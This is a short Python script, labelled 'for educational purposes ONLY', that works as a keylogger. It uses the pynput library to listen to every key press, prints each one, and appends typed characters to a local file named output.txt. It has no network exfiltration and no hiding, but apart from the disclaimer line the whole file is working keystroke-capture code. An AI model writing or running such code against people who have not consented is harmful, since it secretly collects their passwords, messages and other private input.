#For educational purposes ONLY

from pynput import keyboard

def keyStroke(key):
        print(str(key))
        with open("output.txt", "a") as logKey:
            try:
                char = key.char
                logKey.write(char)
            except:
                print("Key not found")
                
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyStroke)
    listener.start()
    input()
